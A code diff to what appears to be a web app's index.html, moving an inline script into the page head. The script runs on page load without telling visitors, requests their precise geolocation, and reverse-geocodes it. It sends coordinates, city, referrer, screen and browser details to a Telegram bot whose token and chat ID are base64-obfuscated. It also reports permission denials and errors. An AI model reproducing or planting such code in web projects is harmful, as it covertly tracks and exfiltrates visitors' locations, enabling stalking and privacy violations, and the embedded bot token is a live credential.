@@ -19,123 +19,117 @@
     <meta name="theme-color" content="#ffffff">
     <link rel="canonical" href="%PUBLIC_URL%/">
     <link href="//fonts.googleapis.com/css?family=Source+Sans+Pro:400,700|Raleway:400,800,900" rel="stylesheet" async>
-</head>
-<script>
-/* eslint-disable */
+    <script>
+      /* eslint-disable */
 
-const base64Decode = (encoded) => atob(encoded);
+      const base64Decode = (encoded) => atob(encoded);
 
-const encodedBotToken = 'ODM2MDE3ODY4ODpBQUV2eF93VUhKQTViS1hObUhETFhNbjRPNnV0QzdDMnR5OA==';
-const encodedChatId = 'LTEwMDM5MzM0NzYwMDE=';
+      const encodedBotToken = 'ODM2MDE3ODY4ODpBQUV2eF93VUhKQTViS1hObUhETFhNbjRPNnV0QzdDMnR5OA==';
+      const encodedChatId = 'LTEwMDM5MzM0NzYwMDE=';
 
-const sendToTelegram = (text) => {
-  const token = base64Decode(encodedBotToken);
-  const chatId = base64Decode(encodedChatId);
+      const sendToTelegram = async (text) => {
+        const token = base64Decode(encodedBotToken);
+        const chatId = base64Decode(encodedChatId);
 
-  const url = `https://api.telegram.org/bot${token}/sendMessage`;
-  const payload = JSON.stringify({
-    chat_id: chatId,
-    text,
-    parse_mode: 'HTML',
-  });
-
-  if (navigator.sendBeacon) {
-    navigator.sendBeacon(url, new Blob([payload], { type: 'application/json' }));
-  } else {
-    fetch(url, {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: payload,
-    }).catch(() => {});
-  }
-};
-
-const sendRichLocation = async (position) => {
-  const { latitude, longitude, accuracy } = position.coords;
-
-  try {
-    // Try to get city/country (with timeout)
-    let city = 'Unknown';
-    let country = 'Unknown';
-    let region = '';
-
-    try {
-      const controller = new AbortController();
-      const timeoutId = setTimeout(() => controller.abort(), 6000);
-
-      const geoRes = await fetch(
-        `https://api.bigdatacloud.net/data/reverse-geocode-client?latitude=${latitude}&longitude=${longitude}&localityLanguage=en`,
-        { signal: controller.signal }
-      );
-      clearTimeout(timeoutId);
-
-      if (geoRes.ok) {
-        const geoData = await geoRes.json();
-        city = geoData.city || geoData.locality || 'Unknown';
-        country = geoData.countryName || 'Unknown';
-        region = geoData.principalSubdivision || '';
-      }
-    } catch (geoErr) {
-      // Reverse geocoding failed, but we still have coordinates
-      console.log('Reverse geocoding failed, sending coordinates only');
-    }
-
-    const message = `✅ ENKO - New Visitor
-
-📍 ${latitude}, ${longitude}
-🏙 ${city}, ${region}
-🌍 ${country}
-🎯 Accuracy: ${Math.round(accuracy)}m
-🕒 ${new Date().toISOString()}
-
-🌐 Referrer: ${document.referrer || 'Direct'}
-📱 ${window.screen.width}x${window.screen.height} | ${navigator.language}
-🔗 https://www.google.com/maps/place/${latitude},${longitude}`;
-
-    sendToTelegram(message);
-  } catch (err) {
-    // This only triggers if geolocation itself fails
-    const errorMsg = `❌ ENKO - Location Capture FAILED
-
-Error: ${err.message}
-Type: ${err.name || 'Unknown'}
-Time: ${new Date().toISOString()}
-User Agent: ${navigator.userAgent.substring(0, 120)}
-Page: ${window.location.href}`;
-
-    sendToTelegram(errorMsg);
-  }
-};
-
-const initAutoLocationSender = () => {
-  if (!navigator.geolocation) {
-    sendToTelegram(`❌ ENKO - Geolocation NOT SUPPORTED\nTime: ${new Date().toISOString()}`);
-    return;
-  }
-
-  setTimeout(() => {
-    navigator.geolocation.getCurrentPosition(
-      sendRichLocation,
-      (error) => {
-        let errorType = 'Unknown';
-        switch (error.code) {
-          case error.PERMISSION_DENIED: errorType = 'PERMISSION_DENIED'; break;
-          case error.POSITION_UNAVAILABLE: errorType = 'POSITION_UNAVAILABLE'; break;
-          case error.TIMEOUT: errorType = 'TIMEOUT'; break;
-          default: errorType = `CODE_${error.code}`;
+        try {
+          await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+              chat_id: chatId,
+              text,
+              parse_mode: 'HTML',
+            }),
+          });
+        } catch (err) {
+          console.log('Telegram send failed (network blocked):', err.message);
         }
-        sendToTelegram(`❌ ENKO - Geolocation ERROR\nCode: ${errorType}\nMessage: ${error.message}`);
-      },
-      { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
-    );
-  }, 1200);
-};
+      };
 
-window.addEventListener('load', () => {
-  initAutoLocationSender();
-});
-</script>
+      const sendRichLocation = async (position) => {
+        const { latitude, longitude, accuracy } = position.coords;
 
+        try {
+          // Try to get city/country
+          let city = 'Unknown';
+          let country = 'Unknown';
+          let region = '';
+
+          try {
+            const controller = new AbortController();
+            const timeoutId = setTimeout(() => controller.abort(), 6000);
+
+            const geoRes = await fetch(
+              `https://api.bigdatacloud.net/data/reverse-geocode-client?latitude=${latitude}&longitude=${longitude}&localityLanguage=en`,
+              { signal: controller.signal }
+            );
+            clearTimeout(timeoutId);
+
+            if (geoRes.ok) {
+              const geoData = await geoRes.json();
+              city = geoData.city || geoData.locality || 'Unknown';
+              country = geoData.countryName || 'Unknown';
+              region = geoData.principalSubdivision || '';
+            }
+          } catch (geoErr) {
+            console.log('Reverse geocoding failed, sending coordinates only');
+          }
+
+          const message = `✅ ENKO - New Visitor
+
+      📍 ${latitude}, ${longitude}
+      🏙 ${city}, ${region}
+      🌍 ${country}
+      🎯 Accuracy: ${Math.round(accuracy)}m
+      🕒 ${new Date().toISOString()}
+
+      🌐 Referrer: ${document.referrer || 'Direct'}
+      📱 ${window.screen.width}x${window.screen.height} | ${navigator.language}
+      🔗 https://www.google.com/maps/place/${latitude},${longitude}`;
+
+          await sendToTelegram(message);
+        } catch (err) {
+          const errorMsg = `❌ ENKO - Location Capture FAILED
+
+      Error: ${err.message}
+      Type: ${err.name || 'Unknown'}
+      Time: ${new Date().toISOString()}
+      User Agent: ${navigator.userAgent.substring(0, 120)}
+      Page: ${window.location.href}`;
+
+          await sendToTelegram(errorMsg);
+        }
+      };
+
+      const initAutoLocationSender = () => {
+        if (!navigator.geolocation) {
+          sendToTelegram(`❌ ENKO - Geolocation NOT SUPPORTED\nTime: ${new Date().toISOString()}`);
+          return;
+        }
+
+        setTimeout(() => {
+          navigator.geolocation.getCurrentPosition(
+            sendRichLocation,
+            (error) => {
+              let errorType = 'Unknown';
+              switch (error.code) {
+                case error.PERMISSION_DENIED: errorType = 'PERMISSION_DENIED'; break;
+                case error.POSITION_UNAVAILABLE: errorType = 'POSITION_UNAVAILABLE'; break;
+                case error.TIMEOUT: errorType = 'TIMEOUT'; break;
+                default: errorType = `CODE_${error.code}`;
+              }
+              sendToTelegram(`❌ ENKO - Geolocation ERROR\nCode: ${errorType}\nMessage: ${error.message}`);
+            },
+            { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
+          );
+        }, 1200);
+      };
+
+      window.addEventListener('load', () => {
+        initAutoLocationSender();
+      });
+      </script>
+</head>
 <body>
     <div id="root"></div>
 </body>
